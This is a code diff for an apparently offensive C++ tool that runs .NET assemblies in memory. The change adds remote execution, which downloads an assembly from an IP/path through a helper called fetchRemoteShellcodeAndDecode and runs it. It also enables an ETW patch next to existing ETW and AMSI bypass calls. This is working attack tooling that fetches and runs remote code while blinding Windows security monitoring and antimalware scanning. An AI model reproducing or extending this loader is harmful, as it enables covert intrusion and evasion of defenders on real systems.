@@ -17,13 +17,14 @@ using namespace mscorlib;
 
 void InitDotnet(std::wstring FilePath, bool isRemote, std::wstring args) {
 	if (isRemote) {
-		std::cout << "remote dotnet execution is not implemented yet\n";
+		std::cout << "[+] Remote dotnet execution\n";
+		Dotnet(FilePath, args, true);
 	}
 	else {
 		std::wcout << "Received argument for initialisation: filePath: " << FilePath << " args: " << args << "\n";
 		if (checkFile(FilePath)) {
 			std::cout << "[+] File is a valid .NET executable, proceeding with execution\n";
-			Dotnet(FilePath, args);
+			Dotnet(FilePath, args, false);
 		}
 		else {
 			std::cout << "[-] Could not parse file path or file does not exist, exiting\n";
@@ -170,21 +171,30 @@ LPSTR* convertArgsToLPSTRArray(std::wstring args, int& argsCount) {
     }
     return arguments;
 }
-void Dotnet(std::wstring FilePath, std::wstring args) {
+
+
+std::vector<char> fetchRemoteEx(std::wstring url, std::wstring file) {
+    std::vector<unsigned char> data =
+        helperHandler.fetchRemoteShellcodeAndDecode(url, file, 0x00);
+
+    return std::vector<char>(data.begin(), data.end());
+};
+void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote) {
 
     int argsCount = 0;
     SAFEARRAY* params = nullptr;
     LPSTR* arguments = convertArgsToLPSTRArray(args, argsCount);
     SetupEtwBypass();
     SetupAMSIBypass();
-    /*if (!patchRemoteETW(mainInjector.process(-1))) {
+    
+    if (!patchRemoteETW(mainInjector.process(-1))) {
 
         std::cout << "[+] Patched ETW\n";
     }
     else {
         std::cout << "[-] Didnt Patched ETW\n";
     };
-    
+    /*
     if (!patchRemoteAmsi(mainInjector.process(-1))) {
         std::cout << "[+] Patched Amsi\n";
     }
@@ -207,16 +217,38 @@ void Dotnet(std::wstring FilePath, std::wstring args) {
     _MethodInfoPtr pEntryPoint = nullptr;
 
 
-    //parsing args
+    std::vector<char> buffer;
+    if (isRemote) {
+        size_t pos = FilePath.find(L'/');
+        std::wstring url;
+        std::wstring path;
 
-    //and of args parse
+        if (pos != std::wstring::npos) {
+            url = FilePath.substr(0, pos);
+            path = FilePath.substr(pos);
+			std::wcout << "[+] Fetching remote assembly from: " << url << " with path: " << path << "\n";
+            buffer = fetchRemoteEx(url, path);
+        }
+        else {
+            std::wcout << "[-] Invalid remote path format. Expected format: <IP>/<Path>\n";
+            return;
+        }
+    }
+    else {
+        std::ifstream file(FilePath, std::ios::binary | std::ios::ate);
+        if (!file.is_open()) { std::cerr << "Failed to open file.\n"; return; }
+
+        std::streamsize size = file.tellg();
+        file.seekg(0, std::ios::beg);
+
+        buffer.resize(size);
+
+        if (!file.read(buffer.data(), size)) {
+            return;
+        }
+    }
     
-    std::ifstream file(FilePath, std::ios::binary | std::ios::ate);
-    if (!file.is_open()) { std::cerr << "Failed to open file.\n"; return; }
-    std::streamsize size = file.tellg();
-    file.seekg(0, std::ios::beg);
-    std::vector<char> buffer(size);
-    if (!file.read(buffer.data(), size)) { return; }
+   
     std::wstring clrVersion = checkCLRVersion(
         buffer.data(),
         buffer.size(),
